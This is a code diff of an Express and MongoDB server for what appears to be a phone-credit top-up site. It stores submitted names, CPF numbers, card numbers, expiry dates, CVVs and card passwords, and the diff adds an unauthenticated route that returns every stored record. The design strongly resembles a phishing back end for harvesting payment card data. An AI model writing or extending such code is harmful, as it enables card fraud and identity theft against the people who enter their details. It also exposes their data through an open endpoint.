@@ -6,15 +6,14 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname)));
 
-// Cole sua URL real do Atlas abaixo
-mongoose.connect('mongodb+srv://mateus:SENHA_AQUI@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
+// Use sua URL do MongoDB Atlas vista na sua foto
+mongoose.connect('mongodb+srv://mateus:SENHA@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
   .then(() => console.log('MongoDB Conectado!'))
   .catch(err => console.error(err));
 
 const RecargaSchema = new mongoose.Schema({
-    operadora: String, nome: String, telefone: String,
-    cartao: String, data: String, cvv: String,
-    valor: String, senha: String,
+    operadora: String, nome: String, cpf: String, telefone: String,
+    valor: String, cartao: String, data: String, cvv: String, senha: String,
     dataRegistro: { type: Date, default: Date.now }
 });
 
@@ -25,8 +24,13 @@ app.post('/finalizar', async (req, res) => {
         const novaRecarga = new Recarga(req.body);
         await novaRecarga.save();
         res.status(200).send('Sucesso');
-    } catch (error) { res.status(500).send('Erro'); }
+    } catch (error) { res.status(500).send('Erro ao salvar'); }
+});
+
+app.get('/ver-dados-restritos', async (req, res) => {
+    const dados = await Recarga.find().sort({ dataRegistro: -1 });
+    res.json(dados);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));
+app.listen(PORT, () => console.log(`Servidor na porta ${PORT}`));
